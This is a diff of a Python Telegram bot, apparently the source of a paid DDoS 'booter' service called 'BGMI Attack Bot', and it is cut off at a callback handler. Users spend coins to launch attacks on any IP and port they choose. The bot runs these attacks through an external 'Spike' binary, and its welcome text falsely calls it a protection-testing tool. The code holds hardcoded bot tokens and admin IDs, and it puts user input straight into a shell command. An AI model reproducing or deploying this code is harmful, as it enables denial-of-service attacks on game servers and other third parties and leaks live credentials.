@@ -6,495 +6,622 @@ import logging
 import threading
 import asyncio
 from datetime import datetime, timedelta, timezone
-from PIL import Image
-import imagehash
 import time
 import requests
-from telebot import TeleBot, types
 from requests.exceptions import ReadTimeout
 
 # Initialize logging
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-# Telegram bot token and channel IDs
-TOKEN = '7788865701:AAEW3E0_GZWjcwc4oyLKgFSuiV0d849mvXM'  # Replace with your actual bot token
-CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID for attacks
-FEEDBACK_CHANNEL_ID = '-1002124760113'  # Replace with your specific channel ID for feedback
-message_queue = []
-
-# Official channel details
-OFFICIAL_CHANNEL = "@titanfreeop"  # Replace with your channel username or ID
-CHANNEL_LINK = "https://t.me/titanfreeop"  # Replace with your channel link
-
-# Initialize the bot
-bot = telebot.TeleBot(TOKEN)
-# Configure requests session with timeout
-session = requests.Session()
-session.timeout = 60  # 60 seconds timeout for all requests
-# Apply custom session to the bot
-bot.session = session
-
-# Global control variables
-attack_in_progress = False
-reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
-user_cooldowns = {}  # Stores cooldown end times for users
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    filename='bot.log'
+)
 
 # Configuration
-COOLDOWN_DURATION = 60  # 1 minute cooldown
-EXEMPTED_USERS = [7163028849, 7184121244]
-MAX_ATTACK_DURATION = 120  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
-ATTACK_COST = 5  # Coins deducted per attack
+TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'
+CHANNEL_ID = '-1002298552334'
+OFFICIAL_CHANNEL = "@titanfreeop"
+CHANNEL_LINK = "https://t.me/titanfreeop"
+ADMIN_IDS = [7163028849, 7184121244]
 
 # File paths
 USERS_FILE = "users.txt"
-BALANCE_FILE = "balance.txt"
+LOGS_FILE = "logs.txt"
 
-def load_users():
-    """Load users with access from file."""
+# Initialize bot
+bot = telebot.TeleBot(TOKEN)
+session = requests.Session()
+session.timeout = 60
+bot.session = session
+
+# Global variables
+attack_in_progress = False
+COOLDOWN_DURATION = 60
+MAX_ATTACK_DURATION = 60
+ATTACK_COST = 5
+user_cooldowns = {}
+
+# Ensure files exist
+for file in [USERS_FILE, LOGS_FILE]:
+    if not os.path.exists(file):
+        open(file, 'w').close()
+
+def log_action(action, user_id=None, details=""):
+    """Log actions to logs file"""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    user_info = f"User {user_id}" if user_id else "System"
+    log_entry = f"{timestamp} | {user_info} | {action} | {details}\n"
+    
+    with open(LOGS_FILE, 'a') as f:
+        f.write(log_entry)
+
+def get_user_info(user_id):
+    """Get user info from Telegram"""
+    try:
+        user = bot.get_chat(user_id)
+        return {
+            'username': f"@{user.username}" if user.username else "None",
+            'first_name': user.first_name if user.first_name else "None",
+            'last_name': user.last_name if user.last_name else "None"
+        }
+    except Exception as e:
+        logging.error(f"Error getting user info: {e}")
+        return {
+            'username': "Unknown",
+            'first_name': "Unknown",
+            'last_name': "Unknown"
+        }
+
+def add_coins(user_id, coins):
+    """Add coins to user balance"""
     users = {}
     if os.path.exists(USERS_FILE):
         with open(USERS_FILE, 'r') as f:
             for line in f:
-                uid, expiry = line.strip().split()
-                users[int(uid)] = datetime.strptime(expiry, "%Y-%m-%d")
-    return users
-
-def save_users(users):
-    """Save users with access to file."""
+                try:
+                    uid, balance, attacks = line.strip().split('|')
+                    users[int(uid)] = {
+                        'balance': int(balance),
+                        'attacks': int(attacks)
+                    }
+                except:
+                    continue
+    
+    if user_id not in users:
+        users[user_id] = {'balance': 0, 'attacks': 0}
+    
+    users[user_id]['balance'] += coins
+    
     with open(USERS_FILE, 'w') as f:
-        for uid, expiry in users.items():
-            f.write(f"{uid} {expiry.strftime('%Y-%m-%d')}\n")
+        for uid, data in users.items():
+            f.write(f"{uid}|{data['balance']}|{data['attacks']}\n")
+    
+    log_action("ADD_COINS", user_id, f"Added {coins} coins")
 
-def load_balances():
-    """Load user balances from file."""
-    balances = {}
-    if os.path.exists(BALANCE_FILE):
-        with open(BALANCE_FILE, 'r') as f:
+def deduct_coins(user_id, amount):
+    """Deduct coins from user balance"""
+    users = {}
+    if os.path.exists(USERS_FILE):
+        with open(USERS_FILE, 'r') as f:
             for line in f:
-                uid, balance = line.strip().split()
-                balances[int(uid)] = int(balance)
-    return balances
+                try:
+                    uid, balance, attacks = line.strip().split('|')
+                    users[int(uid)] = {
+                        'balance': int(balance),
+                        'attacks': int(attacks)
+                    }
+                except:
+                    continue
+    
+    if user_id not in users or users[user_id]['balance'] < amount:
+        return False
+    
+    users[user_id]['balance'] -= amount
+    users[user_id]['attacks'] += 1
+    
+    with open(USERS_FILE, 'w') as f:
+        for uid, data in users.items():
+            f.write(f"{uid}|{data['balance']}|{data['attacks']}\n")
+    
+    log_action("DEDUCT_COINS", user_id, f"Deducted {amount} coins")
+    return True
 
-def save_balances(balances):
-    """Save user balances to file."""
-    with open(BALANCE_FILE, 'w') as f:
-        for uid, balance in balances.items():
-            f.write(f"{uid} {balance}\n")
+def get_user_stats(user_id):
+    """Get user stats"""
+    if os.path.exists(USERS_FILE):
+        with open(USERS_FILE, 'r') as f:
+            for line in f:
+                try:
+                    uid, balance, attacks = line.strip().split('|')
+                    if int(uid) == user_id:
+                        return {
+                            'balance': int(balance),
+                            'attacks': int(attacks)
+                        }
+                except:
+                    continue
+    return {'balance': 0, 'attacks': 0}
 
 def is_member(user_id):
-    """Check if the user is a member of the official channel."""
+    """Check if user is member of official channel"""
     try:
         chat_member = bot.get_chat_member(OFFICIAL_CHANNEL, user_id)
         return chat_member.status in ["member", "administrator", "creator"]
     except Exception as e:
-        logging.error(f"Failed to check membership: {e}")
+        logging.error(f"Error checking membership: {e}")
         return False
-
-def sanitize_filename(filename):
-    """Sanitize filenames to prevent path traversal."""
-    return re.sub(r'[^\w_.-]', '_', filename)
-
-def get_image_hash(image_path):
-    """Generate perceptual hash for image."""
-    with Image.open(image_path) as img:
-        return str(imagehash.average_hash(img))
-
-def safe_reply_to(message, text, retries=3):
-    for _ in range(retries):
-        try:
-            return bot.reply_to(message, text)
-        except ReadTimeout:
-            logging.warning("Timeout occurred, retrying...")
-            continue
-    logging.error("Failed to send message after multiple retries")
-
-def reset_daily_counts():
-    """Reset daily counters at midnight IST."""
-    global reset_time
-    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
-    if ist_now >= reset_time + timedelta(days=1):
-        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
-
-def has_access(user_id):
-    """Check if user has access either through subscription or balance."""
-    users = load_users()
-    balances = load_balances()
-    
-    # Check if user is exempted
-    if user_id in EXEMPTED_USERS:
-        return True
-    
-    # Check subscription access
-    if user_id in users and datetime.now() < users[user_id]:
-        return True
-    
-    # Check balance access
-    if user_id in balances and balances[user_id] >= ATTACK_COST:
-        return True
-    
-    return False
-
-@bot.message_handler(commands=['users'])
-def list_users(message):
-    """List all users with their access plans and balances."""
-    if message.from_user.id not in EXEMPTED_USERS:
-        bot.reply_to(message, "⚠️ Only admins can use this command.")
-        return
-
-    users = load_users()
-    balances = load_balances()
-    
-    if not users and not balances:
-        bot.reply_to(message, "No users found in the system.")
-        return
-    
-    response = "📊 *User List* 📊\n\n"
-    response += "🆔 User ID | 📅 Plan Expiry | 💰 Balance\n"
-    response += "--------------------------------\n"
-    
-    # Combine all unique user IDs
-    all_user_ids = set(users.keys()).union(set(balances.keys()))
-    
-    for user_id in sorted(all_user_ids):
-        # Get user info
-        plan_info = "No plan" 
-        if user_id in users:
-            days_left = (users[user_id] - datetime.now()).days
-            plan_info = f"{users[user_id].strftime('%Y-%m-%d')} ({days_left}d left)"
-        
-        balance_info = balances.get(user_id, 0)
-        
-        # Check if user is exempted
-        exempt_tag = " (ADMIN)" if user_id in EXEMPTED_USERS else ""
-        
-        response += f"{user_id}{exempt_tag} | {plan_info} | {balance_info} coins\n"
-    
-    # Add summary
-    active_users = sum(1 for uid in users if datetime.now() < users[uid])
-    total_balance = sum(balances.values())
-    
-    response += "\n📈 *Summary*\n"
-    response += f"👥 Total users: {len(all_user_ids)}\n"
-    response += f"✅ Active plans: {active_users}\n"
-    response += f"💰 Total coins in circulation: {total_balance}\n\n"
-    response += "Use /add <uid> <days> to add plan\n"
-    response += "Use /add_balance <uid> <amount> to add coins"
-    
-    try:
-        bot.reply_to(message, response, parse_mode="Markdown")
-    except Exception as e:
-        # If message is too long, split it
-        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
-        for part in parts:
-            bot.reply_to(message, part, parse_mode="Markdown")
-
-@bot.message_handler(commands=['bgmi'])
-def bgmi_command(message):
-    global attack_in_progress
-    reset_daily_counts()
-    user_id = message.from_user.id
-
-    # Check if user has joined the official channel
-    if not is_member(user_id):
-        # Create a "Join Channel" button
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🌟 Join Official Channel 🌟", url=CHANNEL_LINK))
-        markup.add(InlineKeyboardButton("✅ I've Joined", callback_data="check_membership"))
-
-        bot.reply_to(
-            message,
-            "🚨 *Access Denied* 🚨\n\n"
-            "To use this bot, you must join our official channel.\n"
-            "Click the button below to join and then press *'I've Joined'* to verify.",
-            reply_markup=markup,
-            parse_mode="Markdown"
-        )
-        return
-
-    # Channel restriction check
-    if str(message.chat.id) != CHANNEL_ID:
-        bot.send_message(message.chat.id, "⚠️ Unauthorized usage detected!")
-        return
-
-    # Check if user has access
-    if not has_access(user_id):
-        bot.reply_to(
-            message,
-            "🚫 *Access Denied* 🚫\n\n"
-            "You don't have active access to use this bot.\n"
-            "Please contact @TITANOP24 to purchase a plan.",
-            parse_mode="Markdown"
-        )
-        return
-
-    # Check cooldown
-    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
-        remaining = user_cooldowns[user_id] - datetime.now()
-        bot.reply_to(message, f"⏳ Cooldown active. Please wait {remaining.seconds} seconds.")
-        return
-
-    # Attack concurrency control
-    if attack_in_progress:
-        bot.reply_to(message, "⚡ Another attack is running. Wait your turn.")
-        return
-
-    # Process attack
-    try:
-        args = message.text.split()[1:]
-        if len(args) != 3:
-            raise ValueError("Usage: /bgmi <IP> <PORT> <DURATION>")
-
-        ip, port, duration = args
-        if not (ip.count('.') == 3 and all(0<=int(p)<=255 for p in ip.split('.'))):
-            raise ValueError("Invalid IP address")
-        if not port.isdigit() or not 0<=int(port)<=65535:
-            raise ValueError("Invalid port")
-        if not duration.isdigit():
-            raise ValueError("Invalid duration")
-
-        duration = int(duration)
-        if duration > MAX_ATTACK_DURATION:
-            raise ValueError(f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
-
-        # Check and deduct balance if not exempted
-        if user_id not in EXEMPTED_USERS:
-            balances = load_balances()
-            if user_id in balances and balances[user_id] >= ATTACK_COST:
-                balances[user_id] -= ATTACK_COST
-                save_balances(balances)
-            else:
-                raise ValueError("Insufficient balance. Please top up.")
-
-        # Update attack status and set cooldown
-        attack_in_progress = True
-        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
-
-        # Get attacker's username or full name
-        user = message.from_user
-        attacker_name = f"@{user.username}" if user.username else user.full_name
-
-        # Create a "Support" button
-        support_button = InlineKeyboardMarkup()
-        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/titanfreeop"))
-
-        # Send attack confirmation with attacker's name and support button
-        bot.reply_to(
-            message,
-            f"🚀 Attack Sent Successfully! 🚀\n"
-            f"🎯 Target:- {ip}:{port}\n"
-            f"⏳ Time:- {duration}s\n"
-            f"👤 Attacker:- {attacker_name}\n"
-            f"💲 Coins deducted: {ATTACK_COST}\n"
-            f"⏱️ Cooldown: {COOLDOWN_DURATION}s",
-            reply_markup=support_button
-        )
-
-        # Execute the attack
-        asyncio.run(execute_attack(ip, port, duration, message.from_user.first_name))
-
-    except Exception as e:
-        bot.reply_to(message, f"⚠️ Error: {str(e)}")
-        logging.error(f"Attack error: {str(e)}")
-    finally:
-        attack_in_progress = False
-
-@bot.message_handler(commands=['add'])
-def add_user_command(message):
-    """Add user access for specific duration."""
-    if message.from_user.id not in EXEMPTED_USERS:
-        bot.reply_to(message, "⚠️ Only admins can use this command.")
-        return
-
-    try:
-        args = message.text.split()[1:]
-        if len(args) != 2:
-            raise ValueError("Usage: /add <user_id> <days>")
-
-        user_id = int(args[0])
-        days = int(args[1])
-
-        users = load_users()
-        expiry_date = datetime.now() + timedelta(days=days)
-        users[user_id] = expiry_date
-        save_users(users)
-
-        bot.reply_to(message, f"✅ User {user_id} granted access for {days} days until {expiry_date.strftime('%Y-%m-%d')}")
-
-    except Exception as e:
-        bot.reply_to(message, f"⚠️ Error: {str(e)}")
-
-@bot.message_handler(commands=['add_balance'])
-def add_balance_command(message):
-    """Add balance to user account."""
-    if message.from_user.id not in EXEMPTED_USERS:
-        bot.reply_to(message, "⚠️ Only admins can use this command.")
-        return
-
-    try:
-        args = message.text.split()[1:]
-        if len(args) != 2:
-            raise ValueError("Usage: /add_balance <user_id> <amount>")
-
-        user_id = int(args[0])
-        amount = int(args[1])
-
-        balances = load_balances()
-        balances[user_id] = balances.get(user_id, 0) + amount
-        save_balances(balances)
-
-        bot.reply_to(message, f"✅ Added {amount} coins to user {user_id}. New balance: {balances[user_id]}")
-
-    except Exception as e:
-        bot.reply_to(message, f"⚠️ Error: {str(e)}")
-
-@bot.message_handler(commands=['balance'])
-def check_balance_command(message):
-    """Check user's balance."""
-    user_id = message.from_user.id
-    balances = load_balances()
-    balance = balances.get(user_id, 0)
-    
-    bot.reply_to(
-        message,
-        f"💰 Your current balance: {balance} coins\n"
-        f"💸 Cost per attack: {ATTACK_COST} coins\n\n"
-        f"To top up, contact @TITANOP24"
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
-def check_membership(call):
-    """Handle the 'I've Joined' button click."""
-    user_id = call.from_user.id
-    if is_member(user_id):
-        bot.answer_callback_query(call.id, "✅ Thank you for joining! You can now use /bgmi.")
-    else:
-        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet. Please join and try again.")
-
-async def execute_attack(ip, port, duration, username):
-    """Run attack command asynchronously with predefined packet size and thread count."""
-    try:
-        # Start the attack process with predefined values
-        proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 12 750",
-            stderr=asyncio.subprocess.PIPE
-        )
-
-        # Wait for the attack duration to complete
-        await asyncio.sleep(duration)
-
-        # Send attack completion message
-        bot.send_message(
-            CHANNEL_ID,
-            f"✅ Attack on {ip}:{port} completed! "
-            f"Duration: {duration}s"
-        )
-    except Exception as e:
-        # Send error message if something goes wrong
-        bot.send_message(
-            CHANNEL_ID,
-            f"❌ Attack on {ip}:{port} failed: {str(e)}"
-        )
-    finally:
-        # Ensure the process is terminated
-        if proc and proc.returncode is None:
-            proc.terminate()
-            await proc.wait()
-
-@bot.callback_query_handler(func=lambda call: call.data == "start_bgmi")
-def callback_query(call):
-    bot.answer_callback_query(call.id)  # Acknowledge the callback
-    bot.send_message(call.message.chat.id, "Please type /bgmi in the chat to continue.")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    welcome_text = """
-    🚀 *Welcome to BGMI Attack Bot* 🛡️
+    """Send welcome message"""
+    user = message.from_user
+    user_info = get_user_info(user.id)
     
-    *_A Powerful DDoS Protection Testing Tool_*
+    welcome_msg = f"""
+    🎮 *Welcome {user_info['first_name']} to BGMI Attack Bot* 🛡️
     
-    📌 *Quick Start Guide*
-    1️⃣ Use /bgmi command to start attack
-    2️⃣ Follow format: /bgmi IP PORT TIME
-    3️⃣ Ensure you have sufficient balance
+    ⚡ *Premium DDoS Protection Testing Tool* ⚡
     
-    ⚠️ *Rules*
-    - Max attack time: 1 minutes ⏳
-    - Cost per attack: 5 coins 💰
-    - Must join official channel 📢
-    - Cooldown: 60 seconds between attacks ⏱️
+    💎 *Features:*
+    - Powerful attack methods
+    - Simple to use
+    - Real-time monitoring
     
-    🔗 Support: @titanfreeop
-    🔰 Owner : @Titanop24
+    📌 *Quick Guide:*
+    1️⃣ Use /bgmi IP PORT TIME
+    2️⃣ Each attack costs {ATTACK_COST} coins
+    3️⃣ Check coins with /plan
+    
+    🔐 *Requirements:*
+    - Must join {OFFICIAL_CHANNEL}
+    - Need sufficient coins
+    
+    💰 *Get Coins:* @Titanop24
     """
     
-    # Add quick action buttons
-    markup = telebot.types.InlineKeyboardMarkup()
-    markup.add(
-        telebot.types.InlineKeyboardButton("⚡ Start Attack", callback_data='start_bgmi'),
-        telebot.types.InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
+    markup = InlineKeyboardMarkup()
+    markup.row(
+        InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK),
+        InlineKeyboardButton("💰 Buy Coins", url="https://t.me/Titanop24")
+    )
+    markup.row(
+        InlineKeyboardButton("⚡ Start Attack", callback_data='start_attack'),
+        InlineKeyboardButton("📊 My Stats", callback_data='my_stats')
     )
     
     bot.send_message(
         message.chat.id,
-        welcome_text,
+        welcome_msg,
         parse_mode='Markdown',
         reply_markup=markup
     )
+    
+    log_action("START", user.id)
 
-@bot.message_handler(commands=['help'])
-def send_help(message):
-    help_text = """
-    🔧 *BGMI Bot Help Center* 🛠️
+@bot.message_handler(commands=['plan'])
+def show_plan(message):
+    """Show user's plan and coins"""
+    user = message.from_user
+    stats = get_user_stats(user.id)
+    user_info = get_user_info(user.id)
     
-    📝 *Available Commands*
-    /start - Show welcome message 🌟
-    /bgmi - Start attack 🚀
-    /help - Show this help message ❓
-    /balance - Check your coins balance 💰
+    plan_msg = f"""
+    📊 *User Stats for {user_info['first_name']}*
+
+    🆔 User ID: `{user.id}`
+    👤 Username: {user_info['username']}
     
-    🎯 *Attack Format*
-    `/bgmi 1.1.1.1 80 60`
-    - IP: Target IP address 🌐
-    - Port: Target port 🔌
-    - Time: Attack duration in seconds ⏱️
+    💰 *Coins Balance:* {stats['balance']}
+    ⚔️ Total Attacks: {stats['attacks']}
     
-    💰 *Balance System*
-    - Each attack costs 5 coins
-    - Contact @TITANOP24 to purchase coins
-    - 60 second cooldown between attacks ⏱️
+    💸 *Attack Cost:* {ATTACK_COST} coins per attack
+    ⏳ Cooldown: {COOLDOWN_DURATION} seconds
     
-    📌 *Need Help?*
-    Contact support: @titanfreeop
-    Report issues: @Titanop24
+    🔋 *Status:* {'✅ Active' if stats['balance'] >= ATTACK_COST else '❌ Insufficient coins'}
+    
+    💳 To purchase coins, contact @Titanop24
     """
     
-    # Add support buttons
-    markup = telebot.types.InlineKeyboardMarkup()
-    markup.add(
-        telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/Titanop24'),
-        telebot.types.InlineKeyboardButton("💰 Buy Coins", url='t.me/Titanop24')
+    bot.reply_to(
+        message,
+        plan_msg,
+        parse_mode='Markdown'
     )
     
-    bot.send_message(
-        message.chat.id,
-        help_text,
-        parse_mode='Markdown',
-        reply_markup=markup
-    )
+    log_action("CHECK_PLAN", user.id)
 
-def message_worker():
-    while True:
-        if message_queue:
-            msg = message_queue.pop(0)
+@bot.message_handler(commands=['bgmi'])
+def bgmi_command(message):
+    """Handle attack command"""
+    global attack_in_progress
+    user = message.from_user
+    
+    # Check channel membership
+    if not is_member(user.id):
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🌟 Join Channel", url=CHANNEL_LINK))
+        
+        bot.reply_to(
+            message,
+            "🚫 *Access Denied*\n\nYou must join our channel to use this bot!",
+            parse_mode='Markdown',
+            reply_markup=markup
+        )
+        return
+    
+    # Check if in correct channel
+    if str(message.chat.id) != CHANNEL_ID:
+        bot.reply_to(message, "❌ This command only works in the official channel!")
+        return
+    
+    # Check cooldown
+    if user.id in user_cooldowns and datetime.now() < user_cooldowns[user.id]:
+        remaining = (user_cooldowns[user.id] - datetime.now()).seconds
+        bot.reply_to(
+            message,
+            f"⏳ *Cooldown Active*\n\nPlease wait {remaining} seconds before next attack!",
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Check attack in progress
+    if attack_in_progress:
+        bot.reply_to(
+            message,
+            "⚡ *Attack in Progress*\n\nAnother attack is currently running. Please wait!",
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Parse command
+    try:
+        args = message.text.split()[1:]
+        if len(args) != 3:
+            raise ValueError("Invalid format. Use: /bgmi IP PORT TIME")
+        
+        ip, port, duration = args
+        
+        # Validate IP
+        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
+            raise ValueError("Invalid IP address format")
+        
+        # Validate port
+        if not port.isdigit() or not 1 <= int(port) <= 65535:
+            raise ValueError("Port must be between 1-65535")
+        
+        # Validate duration
+        if not duration.isdigit() or not 1 <= int(duration) <= MAX_ATTACK_DURATION:
+            raise ValueError(f"Duration must be 1-{MAX_ATTACK_DURATION} seconds")
+        
+        duration = int(duration)
+        
+        # Check coins
+        if not deduct_coins(user.id, ATTACK_COST):
+            raise ValueError(f"Insufficient coins. You need {ATTACK_COST} coins per attack")
+        
+        # Start attack
+        attack_in_progress = True
+        user_cooldowns[user.id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
+        
+        # Get user info
+        user_info = get_user_info(user.id)
+        attacker_name = user_info['username'] if user_info['username'] != "None" else user_info['first_name']
+        
+        # Send confirmation
+        confirm_msg = f"""
+        🚀 *Attack Launched Successfully!*
+        
+        🎯 Target: `{ip}:{port}`
+        ⏳ Duration: {duration} seconds
+        👤 Attacker: {attacker_name}
+        
+        💰 Coins Used: {ATTACK_COST}
+        ⏱️ Cooldown: {COOLDOWN_DURATION}s
+        
+        🛡️ Attack will complete automatically!
+        """
+        
+        bot.reply_to(
+            message,
+            confirm_msg,
+            parse_mode='Markdown'
+        )
+        
+        # Execute attack
+        asyncio.run(execute_attack(ip, port, duration, user.id))
+        
+    except Exception as e:
+        bot.reply_to(
+            message,
+            f"❌ *Error*\n\n{str(e)}",
+            parse_mode='Markdown'
+        )
+        logging.error(f"Attack error: {e}")
+    finally:
+        attack_in_progress = False
+
+async def execute_attack(ip, port, duration, user_id):
+    """Execute attack using Spike binary with specified parameters"""
+    try:
+        # Get absolute path to binary
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        binary_path = os.path.join(script_dir, "Spike")
+        
+        # Validate binary exists and is executable
+        if not os.path.exists(binary_path):
+            raise Exception("Attack binary 'Spike' not found in bot directory")
+        
+        if not os.access(binary_path, os.X_OK):
+            raise Exception("Attack binary 'Spike' is not executable (run: chmod +x Spike)")
+
+        # Prepare the attack command with your specified parameters
+        cmd = f"{binary_path} {ip} {port} {duration} 12 750"
+        
+        # Debug logging
+        log_action("ATTACK_LAUNCH", user_id, f"Command: {cmd}")
+
+        # Create subprocess
+        proc = await asyncio.create_subprocess_shell(
+            cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            shell=True
+        )
+
+        # Wait for completion with timeout (duration + 30 seconds buffer)
+        try:
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=duration + 30)
+            
+            # Check return code
+            if proc.returncode != 0:
+                error_output = stderr.decode().strip() if stderr else "No error output"
+                raise Exception(f"Attack failed with code {proc.returncode}. Error: {error_output}")
+
+        except asyncio.TimeoutError:
+            proc.terminate()
+            await proc.wait()
+            raise Exception(f"Attack timed out after {duration + 30} seconds")
+
+        # Successful attack
+        success_msg = f"""
+        🚀 *Attack Successfully Completed!*
+        
+        ▫️ *Target:* `{ip}:{port}`
+        ▫️ *Duration:* {duration} seconds
+        ▫️ *Attacker:* `{user_id}`
+        ▫️ *Method:* Spike (1024 packets, 10 threads)
+        
+        ```
+        {stdout.decode().strip() if stdout else 'No output from binary'}
+        ```
+        """
+        
+        bot.send_message(
+            CHANNEL_ID,
+            success_msg,
+            parse_mode='Markdown'
+        )
+        log_action("ATTACK_SUCCESS", user_id, f"{ip}:{port} for {duration}s")
+
+    except Exception as e:
+        error_msg = f"""
+        ❌ *Attack Failed!*
+        
+        ▫️ *Target:* `{ip}:{port}`
+        ▫️ *Duration:* {duration}s
+        ▫️ *Error:* `{str(e)}`
+        
+        Please try again or contact support.
+        """
+        
+        bot.send_message(
+            CHANNEL_ID,
+            error_msg,
+            parse_mode='Markdown'
+        )
+        log_action("ATTACK_FAILED", user_id, f"{ip}:{port} - {str(e)}")
+        raise
+
+@bot.message_handler(commands=['add_coin'])
+def add_coin_command(message):
+    """Add coins to user"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Only admins can use this command!")
+        return
+    
+    try:
+        args = message.text.split()[1:]
+        if len(args) != 2:
+            raise ValueError("Usage: /add_coin USER_ID COINS")
+        
+        user_id = int(args[0])
+        coins = int(args[1])
+        
+        add_coins(user_id, coins)
+        
+        user_info = get_user_info(user_id)
+        username = user_info['username'] if user_info['username'] != "None" else user_info['first_name']
+        
+        bot.reply_to(
+            message,
+            f"""
+            ✅ *Coins Added Successfully!*
+            
+            👤 User: {username} (ID: {user_id})
+            💰 Coins Added: {coins}
+            
+            💳 New Balance: {get_user_stats(user_id)['balance']} coins
+            """,
+            parse_mode='Markdown'
+        )
+        
+    except Exception as e:
+        bot.reply_to(
+            message,
+            f"❌ Error: {str(e)}",
+            parse_mode='Markdown'
+        )
+
+@bot.message_handler(commands=['users'])
+def list_users(message):
+    """List all users"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Only admins can use this command!")
+        return
+    
+    try:
+        if not os.path.exists(USERS_FILE) or os.path.getsize(USERS_FILE) == 0:
+            bot.reply_to(message, "📭 No users found in database!")
+            return
+        
+        with open(USERS_FILE, 'r') as f:
+            users_data = f.readlines()
+        
+        total_coins = 0
+        total_attacks = 0
+        users_list = []
+        
+        for line in users_data:
             try:
-                bot.send_message(msg['chat_id'], msg['text'])
-            except ReadTimeout:
-                logging.error("Async message failed after timeout")
-        time.sleep(1)
+                uid, balance, attacks = line.strip().split('|')
+                user_info = get_user_info(int(uid))
+                
+                users_list.append({
+                    'id': int(uid),
+                    'username': user_info['username'],
+                    'first_name': user_info['first_name'],
+                    'last_name': user_info['last_name'],
+                    'balance': int(balance),
+                    'attacks': int(attacks)
+                })
+                
+                total_coins += int(balance)
+                total_attacks += int(attacks)
+            except:
+                continue
+        
+        if not users_list:
+            bot.reply_to(message, "📭 No valid user data found!")
+            return
+        
+        # Sort by balance (descending)
+        users_list.sort(key=lambda x: x['balance'], reverse=True)
+        
+        # Prepare message
+        response = "📊 *All Users*\n\n"
+        response += "🆔 ID | 👤 Name | 💰 Coins | ⚔️ Attacks\n"
+        response += "--------------------------------\n"
+        
+        for user in users_list[:50]:  # Show first 50 users
+            name = user['first_name']
+            if user['last_name'] != "None":
+                name += f" {user['last_name']}"
+            
+            response += (
+                f"{user['id']} | {name} | {user['balance']} | {user['attacks']}\n"
+            )
+        
+        response += f"\n📈 *Totals:* {len(users_list)} users | {total_coins} coins | {total_attacks} attacks"
+        
+        # Send message (split if too long)
+        if len(response) > 4000:
+            parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
+            for part in parts:
+                bot.reply_to(message, part, parse_mode='Markdown')
+        else:
+            bot.reply_to(message, response, parse_mode='Markdown')
+            
+    except Exception as e:
+        bot.reply_to(
+            message,
+            f"❌ Error: {str(e)}",
+            parse_mode='Markdown'
+        )
+        logging.error(f"Users command error: {e}")
 
-# Start worker thread
-threading.Thread(target=message_worker, daemon=True).start()
+@bot.message_handler(commands=['logs'])
+def show_logs(message):
+    """Show logs"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Only admins can use this command!")
+        return
+    
+    try:
+        if not os.path.exists(LOGS_FILE) or os.path.getsize(LOGS_FILE) == 0:
+            bot.reply_to(message, "📭 No logs found!")
+            return
+        
+        with open(LOGS_FILE, 'r') as f:
+            logs = f.readlines()
+        
+        if not logs:
+            bot.reply_to(message, "📭 No logs found!")
+            return
+        
+        # Show last 50 logs
+        logs = logs[-50:]
+        response = "📜 *Recent Logs*\n\n"
+        response += "🕒 Time | 👤 User | 🔧 Action | 📝 Details\n"
+        response += "--------------------------------\n"
+        
+        for log in logs:
+            parts = log.strip().split(' | ')
+            if len(parts) >= 4:
+                response += f"{parts[0]} | {parts[1]} | {parts[2]} | {parts[3]}\n"
+        
+        bot.reply_to(message, response, parse_mode='Markdown')
+        
+    except Exception as e:
+        bot.reply_to(
+            message,
+            f"❌ Error: {str(e)}",
+            parse_mode='Markdown'
+        )
+
+@bot.message_handler(commands=['clear_logs'])
+def clear_logs(message):
+    """Clear logs"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Only admins can use this command!")
+        return
+    
+    try:
+        if not os.path.exists(LOGS_FILE) or os.path.getsize(LOGS_FILE) == 0:
+            bot.reply_to(message, "📭 No logs to clear!")
+            return
+        
+        with open(LOGS_FILE, 'r') as f:
+            log_count = len(f.readlines())
+        
+        open(LOGS_FILE, 'w').close()
+        
+        bot.reply_to(
+            message,
+            f"🧹 *Logs Cleared!*\n\nDeleted {log_count} log entries.",
+            parse_mode='Markdown'
+        )
+        
+        log_action("CLEAR_LOGS", message.from_user.id, f"Cleared {log_count} logs")
+        
+    except Exception as e:
+        bot.reply_to(
+            message,
+            f"❌ Error: {str(e)}",
+            parse_mode='Markdown'
+        )
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callbacks(call):
